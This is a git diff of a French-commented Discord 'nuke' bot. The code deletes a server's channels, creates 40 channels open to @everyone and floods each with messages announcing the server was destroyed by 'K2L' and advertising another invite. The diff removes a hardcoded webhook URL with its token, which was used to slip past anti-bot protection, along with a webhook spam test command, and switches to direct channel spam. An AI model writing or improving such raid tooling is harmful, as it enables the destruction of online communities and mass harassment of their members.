@@ -1,9 +1,6 @@
 const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField } = require('discord.js');
 const http = require('http');
 
-// Ton URL de webhook configurée
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1566422916990505010/lKu7u-ocWRFHCnHBlmamcsKeRbeBfoShTl5259MQrntPCWw6XOcnO1E0wba16WlHsTgL";
-
 // Serveur HTTP pour garder Render actif 24/7
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
@@ -163,14 +160,14 @@ client.on('messageCreate', async message => {
                 channel.delete().catch(() => {});
             });
 
-            // C. Création de salons et flood via Webhook pour bypasser l'antibot
+            // C. Création de salons avec dérogations de perms pour @everyone et flood direct
             for (let i = 0; i < 40; i++) {
                 message.guild.channels.create({
                     name: 'ez-by-k2l',
-                    type: 0,
+                    type: 0, // Salon textuel
                     permissionOverwrites: [
                         {
-                            id: message.guild.id,
+                            id: message.guild.id, // Rôle @everyone
                             allow: [
                                 PermissionsBitField.Flags.ViewChannel,
                                 PermissionsBitField.Flags.SendMessages,
@@ -182,42 +179,16 @@ client.on('messageCreate', async message => {
                         }
                     ]
                 }).then(async channel => {
-                    for (let j = 0; j < 5; j++) {
-                        setTimeout(async () => {
-                            try {
-                                await fetch(WEBHOOK_URL, {
-                                    method: 'POST',
-                                    headers: { 'Content-Type': 'application/json' },
-                                    body: JSON.stringify({ content: '@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza' })
-                                });
-                            } catch (e) {}
-                        }, j * 500);
+                    for (let j = 0; j < 10; j++) {
+                        channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
                     }
                 }).catch(() => {});
             }
 
-            await message.channel.send("✅ **Nuke exécuté avec succès via Webhook !**");
+            await message.channel.send("✅ **Nuke exécuté avec succès !**");
 
         } catch (error) {
             console.error("Erreur Nuke :", error);
-        }
-    }
-
-    // ==========================================
-    // 4. COMMANDE DE TEST WEBHOOK INDÉPENDANTE (!spamo)
-    // ==========================================
-    if (message.content === '!spamo') {
-        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
-        
-        try {
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: '@everyone TEST WEBHOOK BYPASS RÉUSSI discord.gg/yuza' })
-            });
-            await message.reply("✅ Webhook envoyé avec succès sans déclencher l'antibot !");
-        } catch (error) {
-            await message.reply("❌ Erreur lors de l'envoi du webhook.");
         }
     }
 });
